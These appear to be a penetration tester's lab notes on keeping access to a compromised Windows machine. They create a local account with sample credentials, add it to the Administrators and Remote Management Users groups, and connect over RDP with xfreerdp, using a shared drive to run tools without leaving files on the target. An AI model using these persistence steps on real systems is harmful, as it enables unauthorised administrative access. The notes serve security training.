Now that we have a root shell on the windows box .150 

First we create the account itself:  
`net user USERNAME PASSWORD /add`  

user: keez pw: asdf123

Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:  
`net localgroup Administrators USERNAME /add  
net localgroup "Remote Management Users" USERNAME /add`

We can now rdp to this box for stable access. 


---

I chose to use xfreerdp

`xfreerdp /v:IP /u:USERNAME /p:PASSWORD`

Userful xfreerdp flags:

-   `/dynamic-resolution` -- allows us to resize the window, adjusting the resolution of the target in the process
-   `/size:WIDTHxHEIGHT` -- sets a specific size for targets that don't resize automatically with `/dynamic-resolution`
-   `+clipboard` -- enables clipboard support
-   `/drive:LOCAL_DIRECTORY,SHARE_NAME` -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called `share`, you could use: `/drive:.,share`, with the period (`.`) referring to the current directory

___



from [[enumeration 03]] we know the following ports are open:

```bash
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```



